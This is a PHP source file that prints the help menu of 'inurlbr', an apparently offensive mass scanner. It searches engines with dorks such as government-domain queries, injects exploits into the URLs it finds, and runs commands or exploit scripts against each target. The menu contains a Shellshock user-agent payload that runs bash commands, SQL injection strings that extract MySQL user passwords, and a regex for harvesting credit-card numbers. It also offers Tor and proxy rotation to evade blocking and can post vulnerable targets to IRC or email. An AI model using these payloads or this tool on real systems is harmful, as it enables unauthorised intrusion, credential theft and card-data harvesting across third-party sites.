<?php
function __menu() {

    return system("command clear") . __getOut("        
 {$_SESSION["c1"]}      


    ██░ ██    ▓█████     ██▓        ██▓███  
    ▓██░ ██▒   ▓█   ▀    ▓██▒       ▓██░  ██▒
    ▒██▀▀██░   ▒███      ▒██░       ▓██░ ██▓▒
    ░▓█ ░██    ▒▓█  ▄    ▒██░       ▒██▄█▓▒ ▒
    ░▓█▒░██▓   ░▒████▒   ░██████▒   ▒██▒ ░  ░
    ▒ ░░▒░▒   ░░ ▒░ ░   ░ ▒░▓  ░   ▒▓▒░ ░  ░
    ▒ ░▒░ ░    ░ ░  ░   ░ ░ ▒  ░   ░▒ ░     
    ░  ░░ ░      ░        ░ ░      ░░       
    ░  ░  ░      ░  ░       ░  ░            
                                         
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current PHP version=>[ {$_SESSION["c1"]}" . phpversion() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current script owner=>[ {$_SESSION["c1"]}" . get_current_user() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current uname=>[ {$_SESSION["c1"]}" . php_uname() . "{$_SESSION["c0"]} ]
{$_SESSION["c1"]}[!]{$_SESSION["c0"]}Current pwd =>[ {$_SESSION["c1"]}" . getcwd() . "{$_SESSION["c0"]} ]
" . $_SESSION['config']['line'] . "
    
{$_SESSION["c1"]}-h{$_SESSION["c0"]}
{$_SESSION["c1"]}--help{$_SESSION["c0"]}   Alternative long length help command.
{$_SESSION["c1"]}--ajuda{$_SESSION["c0"]}  Command to specify Help.
{$_SESSION["c1"]}--info{$_SESSION["c0"]}   Information script.
{$_SESSION["c1"]}--update{$_SESSION["c0"]} Code update.    
{$_SESSION["c1"]}-q{$_SESSION["c0"]}       Choose which search engine you want through [{$_SESSION["c2"]}1...24{$_SESSION["c0"]}] / [{$_SESSION["c2"]}e1..6{$_SESSION["c0"]}]]:
     [options]:
     {$_SESSION["c1"]}1{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE / (CSE) GENERIC RANDOM / API
     {$_SESSION["c1"]}2{$_SESSION["c0"]}   - {$_SESSION["c2"]}BING
     {$_SESSION["c1"]}3{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO BR
     {$_SESSION["c1"]}4{$_SESSION["c0"]}   - {$_SESSION["c2"]}ASK
     {$_SESSION["c1"]}6{$_SESSION["c0"]}   - {$_SESSION["c2"]}GOOGLE (API)
     {$_SESSION["c1"]}7{$_SESSION["c0"]}   - {$_SESSION["c2"]}LYCOS
     {$_SESSION["c1"]}8{$_SESSION["c0"]}   - {$_SESSION["c2"]}UOL BR
     {$_SESSION["c1"]}9{$_SESSION["c0"]}   - {$_SESSION["c2"]}YAHOO US
     {$_SESSION["c1"]}10{$_SESSION["c0"]}  - {$_SESSION["c2"]}SAPO
     {$_SESSION["c1"]}11{$_SESSION["c0"]}  - {$_SESSION["c2"]}DMOZ
     {$_SESSION["c1"]}12{$_SESSION["c0"]}  - {$_SESSION["c2"]}GIGABLAST
     {$_SESSION["c1"]}13{$_SESSION["c0"]}  - {$_SESSION["c2"]}NEVER
     {$_SESSION["c1"]}17{$_SESSION["c0"]}  - {$_SESSION["c2"]}HOTBUSCA
     {$_SESSION["c1"]}19{$_SESSION["c0"]}  - {$_SESSION["c2"]}HKSEARCH
     {$_SESSION["c1"]}20{$_SESSION["c0"]}  - {$_SESSION["c2"]}EZILION
     {$_SESSION["c1"]}21{$_SESSION["c0"]}  - {$_SESSION["c2"]}SOGOU
     {$_SESSION["c1"]}22{$_SESSION["c0"]}  - {$_SESSION["c2"]}DUCK DUCK GO
     {$_SESSION["c1"]}24{$_SESSION["c0"]}  - {$_SESSION["c2"]}GOOGLE(CSE) GENERIC RANDOM
     {$_SESSION["c1"]}25{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXALEAD
     {$_SESSION["c1"]}26{$_SESSION["c0"]}  - {$_SESSION["c2"]}STARTPAGE
     {$_SESSION["c1"]}27{$_SESSION["c0"]}  - {$_SESSION["c2"]}QWANT
     ----------------------------------------
                 SPECIAL MOTORS
     ----------------------------------------
     {$_SESSION["c1"]}e1{$_SESSION["c0"]}  - {$_SESSION["c2"]}TOR FIND
     {$_SESSION["c1"]}e2{$_SESSION["c0"]}  - {$_SESSION["c2"]}ELEPHANT
     {$_SESSION["c1"]}e3{$_SESSION["c0"]}  - {$_SESSION["c2"]}TORSEARCH
     {$_SESSION["c1"]}e4{$_SESSION["c0"]}  - {$_SESSION["c2"]}GORCH
     {$_SESSION["c1"]}e5{$_SESSION["c0"]}  - {$_SESSION["c2"]}WIKILEAKS
     {$_SESSION["c1"]}e6{$_SESSION["c0"]}  - {$_SESSION["c2"]}AHMIA
     {$_SESSION["c1"]}e7{$_SESSION["c0"]}  - {$_SESSION["c2"]}OTN
     {$_SESSION["c1"]}e8{$_SESSION["c0"]}  - {$_SESSION["c2"]}EXPLOITS SHODAN
     ----------------------------------------
     {$_SESSION["c1"]}all{$_SESSION["c0"]} - {$_SESSION["c2"]}All search engines / not special motors{$_SESSION["c0"]}
     Default:    {$_SESSION["c1"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1{$_SESSION["c0"]}
              {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}5{$_SESSION["c0"]}
               Using more than one engine:  {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}1,2,5,6,11,24{$_SESSION["c0"]}
               Using all engines:      {$_SESSION["c1"]}-q{$_SESSION["c0"]} {$_SESSION["c2"]}all{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--proxy{$_SESSION["c0"]} Choose which proxy you want to use through the search engine:
     Example: {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}{proxy:port}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}localhost:8118{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}socks5://googleinurl@localhost:9050{$_SESSION["c0"]}
              {$_SESSION["c1"]}--proxy {$_SESSION["c2"]}http://admin:12334@172.16.0.90:8080{$_SESSION["c0"]}
   
 {$_SESSION["c1"]}--proxy-file{$_SESSION["c0"]} Set font file to randomize your proxy to each search engine.
     Example: {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}{proxys}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-file {$_SESSION["c2"]}proxys_list.txt{$_SESSION["c0"]}

 {$_SESSION["c1"]}--time-proxy{$_SESSION["c0"]} Set the time how often the proxy will be exchanged.
     Example: {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--time-proxy {$_SESSION["c2"]}10{$_SESSION["c0"]}

 {$_SESSION["c1"]}--proxy-http-file{$_SESSION["c0"]} Set file with urls http proxy, 
     are used to bular capch search engines
     Example: {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}{youfilehttp}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--proxy-http-file {$_SESSION["c2"]}http_proxys.txt{$_SESSION["c0"]}
         

 {$_SESSION["c1"]}--tor-random{$_SESSION["c0"]} Enables the TOR function, each usage links an unique IP.
 
 {$_SESSION["c1"]}-t{$_SESSION["c0"]}  Choose the validation type: op {$_SESSION["c2"]}1, 2, 3, 4, 5{$_SESSION["c0"]}
     [options]:
     {$_SESSION["c2"]}1{$_SESSION["c0"]}   - The first type uses default errors considering the script:
     It establishes connection with the exploit through the get method.
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}2{$_SESSION["c0"]}   -  The second type tries to valid the error defined by: {$_SESSION["c1"]}-a={$_SESSION["c2"]}'VALUE_INSIDE_THE _TARGET'{$_SESSION["c0"]}
     It also establishes connection with the exploit through the get method
     Demo: www.alvo.com.br/pasta/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
   
     {$_SESSION["c2"]}3{$_SESSION["c0"]}   - The third type combine both first and second types:
     Then, of course, it also establishes connection with the exploit through the get method
     Demo: www.target.com.br{$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     Default:    {$_SESSION["c2"]}1{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-t {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-t {$_SESSION["c2"]}1{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}4{$_SESSION["c0"]}   - The fourth type a validation based on source file and will be enabled scanner standard functions.
     The source file their values are concatenated with target url.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/index.php?id=
     /pag/index.php?id=
     /brazil.php?new=
     Demo: 
     www.target.com.br/admin/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/pag/index.php?id={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     www.target.com.br/brazil.php?new={$_SESSION["c3"]}{exploit}{$_SESSION["c0"]}
     
     {$_SESSION["c2"]}5{$_SESSION["c0"]}   - (FIND PAGE) The fifth type of validation based on the source file,
     Will be enabled only one validation code 200 on the target server, or if the url submit such code will be considered vulnerable.
     - Set your target with command {$_SESSION["c1"]}--target {$_SESSION["c2"]}{http://target}{$_SESSION["c0"]}
     - Set your file with command {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Explicative:
     Source file values:
     /admin/admin.php
     /admin.asp
     /admin.aspx
     Demo: 
     www.target.com.br/admin/admin.php
     www.target.com.br/admin.asp
     www.target.com.br/admin.aspx
     Observation: If it shows the code 200 will be separated in the output file

     DEFAULT ERRORS:  
     {$_SESSION["c11"]}
     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
     [*]ERROR INDEFINITE
     {$_SESSION["c0"]}
         
 {$_SESSION["c1"]}--dork{$_SESSION["c0"]} Defines which dork the search engine will use.
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{dork}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'site:.gov.br inurl:php? id'{$_SESSION["c0"]}
     - Using multiples dorks:
     Example: {$_SESSION["c1"]}--dork {$_SESSION["c2"]}{[DORK]dork1[DORK]dork2[DORK]dork3}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'{$_SESSION["c0"]}
 
 {$_SESSION["c1"]}--dork-file{$_SESSION["c0"]} Set font file with your search dorks.
     Example: {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}{dork_file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--dork-file {$_SESSION["c2"]}'dorks.txt'{$_SESSION["c0"]}

 {$_SESSION["c1"]}--exploit-get{$_SESSION["c0"]} Defines which exploit will be injected through the GET method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}{exploit_get}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-get {$_SESSION["c3"]}\"?'´%270x27;\"{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-post{$_SESSION["c0"]} Defines which exploit will be injected through the POST method to each URL found.
     Example: {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}{exploit_post}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-post {$_SESSION["c3"]}'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]} Defines which exploit/parameter will be executed in the options: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all{$_SESSION["c0"]}.   
     The exploit-command will be identified by the paramaters: {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}      
     Ex {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf' {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'curl -v {$_SESSION["c8"]}_TARGET_{$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c2"]}'{$_SESSION["c0"]}
     _TARGET_ is the specified URL/TARGET obtained by the process
     _EXPLOIT_ is the exploit/parameter defined by the option {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
     Example: {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}{exploit-command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-command {$_SESSION["c2"]}'/admin/config.conf'{$_SESSION["c0"]}  
     
 {$_SESSION["c1"]}-a{$_SESSION["c0"]}  Specify the string that will be used on the search script:
     Example: {$_SESSION["c1"]}-a {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-a {$_SESSION["c2"]}'<title>hello world</title>'{$_SESSION["c0"]}
     
 {$_SESSION["c1"]}-d{$_SESSION["c0"]}  Specify the script usage op {$_SESSION["c2"]}1, 2, 3, 4, 5.{$_SESSION["c0"]}
     Example: {$_SESSION["c1"]}-d {$_SESSION["c2"]}{op}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-d {$_SESSION["c2"]}1 {$_SESSION["c0"]}/URL of the search engine.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}2 {$_SESSION["c0"]}/Show all the url.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}3 {$_SESSION["c0"]}/Detailed request of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}4 {$_SESSION["c0"]}/Shows the HTML of every URL.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}5 {$_SESSION["c0"]}/Detailed request of all URLs.
              {$_SESSION["c1"]}-d {$_SESSION["c2"]}6 {$_SESSION["c0"]}/Detailed PING - PONG irc.    
             
 {$_SESSION["c1"]}-s{$_SESSION["c0"]}  Specify the output file where it will be saved the vulnerable URLs.
     
     Example: {$_SESSION["c1"]}-s {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-s {$_SESSION["c2"]}your_file.txt
     
 {$_SESSION["c1"]}-o{$_SESSION["c0"]}  Manually manage the vulnerable URLs you want to use from a file, without using a search engine.
     Example: {$_SESSION["c1"]}-o {$_SESSION["c2"]}{file_where_my_urls_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}-o {$_SESSION["c2"]}tests.txt
   
 {$_SESSION["c1"]}--persist{$_SESSION["c0"]}  Attempts when Google blocks your search.
     The script tries to another google host / default = 4
     Example: {$_SESSION["c1"]}--persist {$_SESSION["c2"]}{number_attempts}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--persist {$_SESSION["c2"]}7

 {$_SESSION["c1"]}--ifredirect{$_SESSION["c0"]}  Return validation method post REDIRECT_URL
     Example: {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}{string_validation}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifredirect {$_SESSION["c2"]}'/admin/painel.php'

 {$_SESSION["c1"]}-m{$_SESSION["c0"]}  Enable the search for emails on the urls specified.
  
 {$_SESSION["c1"]}-u{$_SESSION["c0"]}  Enables the search for URL lists on the url specified.
 
 {$_SESSION["c1"]}--gc{$_SESSION["c0"]} Enable validation of values ​​with google webcache.
     
 {$_SESSION["c1"]}--pr{$_SESSION["c0"]}  Progressive scan, used to set operators (dorks), 
     makes the search of a dork and valid results, then goes a dork at a time.
  
 {$_SESSION["c1"]}--file-cookie{$_SESSION["c0"]} Open cookie file.
     
 {$_SESSION["c1"]}--save-as{$_SESSION["c0"]} Save results in a certain place.

 {$_SESSION["c1"]}--shellshock{$_SESSION["c0"]} Explore shellshock vulnerability by setting a malicious user-agent.
 
 {$_SESSION["c1"]}--popup{$_SESSION["c0"]} Run --command all or vuln in a parallel terminal.

 {$_SESSION["c1"]}--cms-check{$_SESSION["c0"]} Enable simple check if the url / target is using CMS.

 {$_SESSION["c1"]}--no-banner{$_SESSION["c0"]} Remove the script presentation banner.
     
 {$_SESSION["c1"]}--unique{$_SESSION["c0"]} Filter results in unique domains.

 {$_SESSION["c1"]}--beep{$_SESSION["c0"]} Beep sound when a vulnerability is found.
     
 {$_SESSION["c1"]}--alexa-rank{$_SESSION["c0"]} Show alexa positioning in the results.
     
 {$_SESSION["c1"]}--robots{$_SESSION["c0"]} Show values file robots.
      
 {$_SESSION["c1"]}--range{$_SESSION["c0"]} Set range IP.
      Example: {$_SESSION["c1"]}--range {$_SESSION["c2"]}{range_start,rage_end}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range {$_SESSION["c2"]}'172.16.0.5#172.16.0.255'

 {$_SESSION["c1"]}--range-rand{$_SESSION["c0"]} Set amount of random ips.
      Example: {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}{rand}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--range-rand {$_SESSION["c2"]}'50'

 {$_SESSION["c1"]}--irc{$_SESSION["c0"]} Sending vulnerable to IRC / server channel.
      Example: {$_SESSION["c1"]}--irc {$_SESSION["c2"]}{server#channel}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--irc {$_SESSION["c2"]}'irc.rizon.net#inurlbrasil'

 {$_SESSION["c1"]}--http-header{$_SESSION["c0"]} Set HTTP header.
      Example: {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--http-header {$_SESSION["c2"]}'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm=\"Top Secret\"'
          
 {$_SESSION["c1"]}--sedmail{$_SESSION["c0"]} Sending vulnerable to email.
      Example: {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}{youemail}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--sedmail {$_SESSION["c2"]}youemail@inurl.com.br
          
 {$_SESSION["c1"]}--delay{$_SESSION["c0"]} Delay between research processes.
      Example: {$_SESSION["c1"]}--delay {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--delay {$_SESSION["c2"]}10
  
 {$_SESSION["c1"]}--time-out{$_SESSION["c0"]} Timeout to exit the process.
      Example: {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}{second}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--time-out {$_SESSION["c2"]}10

 {$_SESSION["c1"]}--ifurl{$_SESSION["c0"]} Filter URLs based on their argument.
      Example: {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}{ifurl}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifurl {$_SESSION["c2"]}index.php?id=

 {$_SESSION["c1"]}--ifcode{$_SESSION["c0"]} Valid results based on your return http code.
      Example: {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}{ifcode}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--ifcode {$_SESSION["c2"]}200
 
 {$_SESSION["c1"]}--ifemail{$_SESSION["c0"]} Filter E-mails based on their argument.
     Example: {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}{file_where_my_emails_are}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--ifemail {$_SESSION["c2"]}sp.gov.br

 {$_SESSION["c1"]}--url-reference{$_SESSION["c0"]} Define referring URL in the request to send him against the target.
      Example: {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}{url}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--url-reference {$_SESSION["c2"]}http://target.com/admin/user/valid.php
 
 {$_SESSION["c1"]}--mp{$_SESSION["c0"]} Limits the number of pages in the search engines.
     Example: {$_SESSION["c1"]}--mp {$_SESSION["c2"]}{limit}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--mp {$_SESSION["c2"]}50
     
 {$_SESSION["c1"]}--user-agent{$_SESSION["c0"]} Define the user agent used in its request against the target.
      Example: {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}{agent}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
      Usage-exploit / SHELLSHOCK:   
      {$_SESSION["c1"]}--user-agent {$_SESSION["c2"]}'() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"'
      Complete command:    
      php inurlbr.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
 
 {$_SESSION["c1"]}--sall{$_SESSION["c0"]} Saves all urls found by the scanner.
     Example: {$_SESSION["c1"]}--sall {$_SESSION["c2"]}{file}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sall {$_SESSION["c2"]}your_file.txt

 {$_SESSION["c1"]}--command-vul{$_SESSION["c0"]} Every vulnerable URL found will execute this command parameters.
     Example: {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-vul {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--command-all{$_SESSION["c0"]} Use this commmand to specify a single command to EVERY URL found.
     Example: {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}{command}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'nmap sV -p 22,80,21 {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]}{$_SESSION["c2"]}'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'./exploit.sh {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} {$_SESSION["c2"]}output.txt'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--command-all {$_SESSION["c2"]}'php miniexploit.php -t {$_SESSION["c8"]}_TARGET_{$_SESSION["c2"]} -s output.txt'{$_SESSION["c0"]}
    [!] Observation:
   
    {$_SESSION["c8"]}_TARGET_{$_SESSION["c0"]} will be replaced by the URL/target found, although if the user  
    doesn't input the get, only the domain will be executed.
   
    {$_SESSION["c14"]}_TARGETFULL_{$_SESSION["c0"]} will be replaced by the original URL / target found.
       
    {$_SESSION["c14"]}_TARGETXPL_{$_SESSION["c0"]} will be replaced by the original URL / target found + EXPLOIT --exploit-get.
       
    {$_SESSION["c9"]}_TARGETIP_{$_SESSION["c0"]} return of ip URL / target found.
        
    {$_SESSION["c8"]}_URI_{$_SESSION["c0"]} Back URL set of folders / target found.
        
    {$_SESSION["c15"]}_RANDOM_{$_SESSION["c0"]} Random strings.
        
    {$_SESSION["c9"]}_PORT_{$_SESSION["c0"]} Capture port of the current test, within the --port-scan process.
   
    {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}  will be replaced by the specified command argument {$_SESSION["c1"]}--exploit-command{$_SESSION["c0"]}.
   The exploit-command will be identified by the parameters {$_SESSION["c1"]}--command-vul/{$_SESSION["c0"]} {$_SESSION["c1"]}--command-all as {$_SESSION["c6"]}_EXPLOIT_{$_SESSION["c0"]}

 {$_SESSION["c1"]}--replace{$_SESSION["c0"]} Replace values ​​in the target URL.
    Example:  {$_SESSION["c1"]}--replace {$_SESSION["c2"]}{value_old[INURL]value_new}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'{$_SESSION["c0"]}
              {$_SESSION["c1"]}--replace {$_SESSION["c2"]}'index.aspx?id=[INURL]index.aspx?id=1%27´'{$_SESSION["c0"]}
                  
 {$_SESSION["c1"]}--remove{$_SESSION["c0"]} Remove values ​​in the target URL.
      Example: {$_SESSION["c1"]}--remove {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
      Usage:   {$_SESSION["c1"]}--remove {$_SESSION["c2"]}'/admin.php?id=0'
              
 {$_SESSION["c1"]}--regexp{$_SESSION["c0"]} Using regular expression to validate his research, the value of the 
    Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    All Major Credit Cards:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'{$_SESSION["c0"]}
    
    IP Addresses:
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'{$_SESSION["c0"]}
    
    EMAIL:   
    Usage:    {$_SESSION["c1"]}--regexp{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
    

 {$_SESSION["c1"]}---regexp-filter{$_SESSION["c0"]} Using regular expression to filter his research, the value of the 
     Expression will be sought within the target/URL.
    Example:  {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} {regular_expression}{$_SESSION["c0"]}
    EMAIL:   
    Usage:    {$_SESSION["c1"]}---regexp-filter{$_SESSION["c2"]} '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'{$_SESSION["c0"]}
 

    [!] Small commands manager:
    
 {$_SESSION["c1"]}--exploit-cad{$_SESSION["c0"]} Command register for use within the scanner.
    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
    Example Format: NMAP::nmap -sV _TARGET_
    Example Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
    Usage:    {$_SESSION["c1"]}--exploit-cad{$_SESSION["c2"]} 'NMAP::nmap -sV _TARGET_'{$_SESSION["c0"]} 
    Observation: Each registered command is identified by an id of your array.
                 Commands are logged in exploits.conf file.

 {$_SESSION["c1"]}--exploit-all-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (all) is run for each target found by the engine.
     Example: {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-all-id {$_SESSION["c2"]}1,2,8,22
         
 {$_SESSION["c1"]}--exploit-vul-id{$_SESSION["c0"]} Execute commands, exploits based on id of use,
    (vull) run command only if the target was considered vulnerable.
     Example: {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}{id,id}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--exploit-vul-id {$_SESSION["c2"]}1,2,8,22

 {$_SESSION["c1"]}--exploit-list{$_SESSION["c0"]} List all entries command in exploits.conf file.


    [!] Running subprocesses:
    
 {$_SESSION["c1"]}--sub-file{$_SESSION["c0"]}  Subprocess performs an injection 
     strings in URLs found by the engine, via GET or POST.
     Example: {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}{youfile}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-file {$_SESSION["c2"]}exploits_get.txt
         
 {$_SESSION["c1"]}--sub-get{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via GET.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-post{$_SESSION["c0"]} defines whether the strings coming from 
     --sub-file will be injected via POST.
     Usage:   {$_SESSION["c1"]}--sub-get
         
 {$_SESSION["c1"]}--sub-concat{$_SESSION["c0"]} Sets string to be concatenated with 
     the target host within the subprocess
     Example: {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}{string}{$_SESSION["c0"]}
     Usage:   {$_SESSION["c1"]}--sub-concat {$_SESSION["c2"]}'/login.php'{$_SESSION["c0"]}

